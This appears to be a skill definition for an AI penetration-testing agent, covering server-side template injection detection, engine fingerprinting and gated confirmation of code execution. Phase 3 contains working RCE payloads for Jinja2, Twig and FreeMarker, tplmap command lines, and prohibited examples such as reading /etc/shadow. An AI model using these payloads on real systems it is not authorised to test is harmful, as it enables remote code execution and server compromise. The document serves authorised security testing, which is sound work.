---
name: vuln-ssti
description: Server-side template injection validation — detect SSTI via mathematical expression probes, fingerprint the template engine (Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, Mako), and confirm code execution with harmless `id` command only when destructive-risk approval is granted.
disable-model-invocation: true
risk: caution
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: yes
evidence-outputs: [command-log, redacted-evidence, finding-draft]
---

# SSTI — server-side template injection validation

Use this skill to validate server-side template injection on an authorized, in-scope target. Confirm that user-controlled input reaches a server-side template engine (Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, Mako, Handlebars, etc.) and is evaluated as template code rather than rendered as plain text. Detect SSTI using mathematical expression probes. Confirm the template engine, then stop. Code execution confirmation via `id` requires destructive-risk maintainer approval.

## Required inputs

- Written scope naming the target, authorized template-injection parameters (user profile fields, search templates, email templates, report generators, CMS template editors, form field values reflected in templates), and explicit permission for SSTI validation.
- Valid authorization cache. Caution risk class: SSTI can lead to remote code execution, file read, and server compromise. Expression probes are safe — code execution requires separate approval.
- Known technology stack from recon — Python (Jinja2/Mako), PHP (Twig/Smarty), Java (FreeMarker/Velocity/Pebble), Ruby (ERB/Slim), Node.js (Handlebars/Pug/EJS), .NET (Razor). This informs which probe syntax to try first.
- List of candidate injection parameters: any parameter whose value is reflected in the response — `?name=`, `?template=`, `?message=`, `?subject=`, `?body=`, `?title=`, `?greeting=`, `?content=`, `?format=`, `?view=`, JSON body fields with template-like names, email template preview endpoints.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy`.
2. `pentest_agent_parse_scope` → `pentest_agent_validate_target`.
3. `pentest_agent_check_authorization` before any active probe.
4. `pentest_agent_build_command` for dry-run argv preview when catalog tools (tplmap) are used.
5. `pentest_agent_execute_tool` for execution — never raw shell. Automated SSTI scanners require destructive-risk approval.
6. `pentest_agent_append_evidence` → `pentest_agent_record_finding` → report.

## Workflow

### Phase 1 — universal detection probes

SSTI is detected by injecting template expressions that produce a predictable output independent of the input. The classic probe is a mathematical expression rendered as its result:

```text
Universal probes (test each independently):

{{7*7}}       → 49  (Jinja2, Twig, Mako, Handlebars)
${7*7}        → 49  (FreeMarker, Velocity, Spring EL)
#{7*7}        → 49  (Ruby HAML, some Spring variants)
<%= 7*7 %>    → 49  (ERB, EJS)
*{7*7}        → 49  (Spring Expression Language)
{7*7}         → 49  (Smarty, if math modifier enabled)
{{7*'7'}}     → 7777777  (Jinja2 — string repeat) vs 49 (Twig — coerces to int)
```

Procedure:
1. For each candidate parameter, inject one probe at a time.
2. Observe the response. If `49` appears where the input was injected → SSTI confirmed, the template engine evaluated the expression.
3. If `7777777` appears → Jinja2 confirmed specifically.
4. If the raw expression is reflected (`{{7*7}}` in output) → the input is not evaluated as a template. The parameter is not SSTI-vulnerable.
5. If an error is returned (e.g., `TemplateSyntaxError`, `ParseError`, `Freemarker runtime error`) → SSTI confirmed via error disclosure. The engine name in the error may fingerprint it.

### Phase 2 — template engine fingerprinting

Once SSTI is confirmed, identify the specific engine:

**Jinja2 (Python/Flask)**:
```text
{{config}}              → dumps Flask config (engine confirmed if output is a dict)
{{self}}                → dumps the template object in debug
{{[].__class__}}        → returns <class 'list'> (Python object introspection)
```

**Twig (PHP/Symfony)**:
```text
{{_self}}               → dumps Twig environment object
{{dump(app)}}           → Symfony var_dump (if debug enabled)
{{7*'7'}}               → returns 49 (Twig coerces to int, unlike Jinja2's '7777777')
```

**FreeMarker (Java)**:
```text
${.data_model}          → dumps data model keys
${.version}             → returns FreeMarker version
${7*7}                  → returns 49
```

**Velocity (Java)**:
```text
#set($x=7*7)$x          → returns 49
$class.inspect           → dumps class info (debug)
```

**Smarty (PHP)**:
```text
{$smarty.version}        → returns Smarty version string
{7*7}                    → returns 49 (if math enabled)
```

**ERB (Ruby)**:
```text
<%= 7*7 %>              → returns 49
<%= Dir.entries('.') %> → lists directory (RCE-capable)
```

**Mako (Python)**:
```text
${7*7}                  → returns 49
${self}                 → dumps template object
```

Record the confirmed engine, version (if disclosed), and the probe that identified it. Do not enumerate engine internals beyond identification.

### Phase 3 — code execution confirmation (requires destructive-risk approval)

Code execution via SSTI requires destructive-risk maintainer approval. When approved, use only the `id` command as proof:

**Jinja2 RCE — `id` proof**:
```text
# Via MRO chain (requires finding correct subclass index):
{{''.__class__.__mro__[1].__subclasses__()}}    → list all (find subprocess.Popen index)
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0].decode()}}

# Via config (simpler, if available):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig RCE — `id` proof**:
```text
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

**FreeMarker RCE — `id` proof**:
```text
${"freemarker.template.utility.Execute"?new()("id")}
```

Procedure:
1. Generate the `id` payload for the confirmed engine.
2. Send the payload.
3. If the response contains `uid=`, `gid=`, or user information → RCE confirmed. Critical finding.
4. Stop immediately. Do not run additional commands, read files, or establish a shell.

Without destructive-risk approval, document "SSTI confirmed on [engine] — RCE likely possible. Engine enables arbitrary code execution via [technique]." and stop.

### Phase 4 — automated tool usage (requires approval)

Tplmap is an SSTI detection and exploitation tool. It requires destructive-risk approval because it tests RCE payloads by default:

When approved:
```text
tplmap.py -u "URL?param=*"                    → detection mode only
tplmap.py -u "URL?param=*" --os-cmd "id"     → RCE confirmation (id only)
```

Never run tplmap with `--os-shell` (interactive shell) against a production target.

## Decision points

- **Stop at expression evaluation**: if `{{7*7}}` renders as `49`, SSTI is confirmed. The engine is executing user-controlled template code. That is a high-severity finding even without RCE proof.
- **Stop at engine identification**: file the finding once the engine is confirmed. RCE exploitation is not required for a valid report.
- **Escalate to critical on RCE confirmation**: if `id` executes, stop and report immediately.
- **Not every template engine parameter is injectable**: if the app uses a fixed template with variable substitution (e.g., `{{ user.name }}` where only `.name` varies), that is not SSTI. The injection requires control over the template expression itself.

## Prohibited behavior

- Executing commands beyond `id` for RCE confirmation.
- Reading files from the server via SSTI (e.g., `cat /etc/passwd`, `open('/etc/shadow')`).
- Writing files, modifying server state, or establishing persistence via SSTI.
- Using sandbox escape techniques to break out of template engine restrictions without explicit approval.
- Running tplmap with `--os-shell`, `--bind-shell`, or `--reverse-shell` against production.
- Enumerating Python subclasses or Java classpaths to find additional RCE vectors after confirming `id` execution.

## Stop conditions

- `{{7*7}}` renders as `49` → SSTI confirmed, stop probing that parameter. Proceed to engine identification.
- Engine identified (Jinja2, Twig, FreeMarker, etc.) → sufficient for finding. Stop.
- RCE `id` confirmed → critical finding. Stop immediately.
- All probes reflected as plain text → parameter not SSTI-vulnerable. Move to next parameter.
- Template engine error with stack trace → SSTI confirmed via error. Redact stack trace. Stop that parameter.

## Evidence — SSTI matrix

For each tested parameter, record:

```text
Parameter: <name> | endpoint: <URL> | method: <GET | POST>
Expression evaluated (7*7=49): <yes | no | error-based>
Template engine: <Jinja2 | Twig | FreeMarker | Velocity | Smarty | ERB | Mako | Handlebars | unknown>
Engine version (if disclosed): <version string>
RCE confirmed (id): <yes | no | not tested (no approval)>
Automated tool used: <none | tplmap detection | tplmap --os-cmd id>
Impact: <none | SSTI confirmed | SSTI + RCE confirmed>
Confidence: <confirmed | likely | needs-review>
```

Aggregate into a parameter × engine matrix. Never store: server file contents, `id` command output with usernames, stack traces with internal file paths, template engine configuration dumps with secret keys or database URLs, or RCE payloads beyond the `id` proof of concept.

## Report handoff

When a finding is confirmed:
1. `pentest_agent_record_finding` with affected parameter, template engine, CVSS estimate (7.5–8.5 for SSTI without confirmed RCE, 9.5–10.0 for SSTI with confirmed RCE), and remediation guidance.
2. Reference the SSTI matrix.
3. Recommend: never pass user-controlled input directly to template engines as template code, use logic-less template systems (Mustache/Handlebars in strict mode) when possible, sandbox template evaluation (restrict available functions and objects), use a separate non-template data format for user-controlled content (JSON → render with fixed template), disable debug mode in production template engines, and run SSTI detection tests in CI with expression probes.
